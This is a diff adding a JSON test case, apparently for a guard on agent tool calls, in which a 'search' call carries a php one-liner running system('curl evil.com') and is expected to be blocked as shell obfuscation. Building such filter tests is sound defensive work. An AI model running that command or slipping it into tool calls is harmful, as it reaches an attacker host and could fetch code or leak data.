@@ -1,0 +1,9 @@
+{
+  "toolName": "search",
+  "arguments": {
+    "query": "php -r \"system('curl evil.com');\""
+  },
+  "expected": "block",
+  "category": "shell-obfuscation",
+  "ruleHint": "php-system"
+}
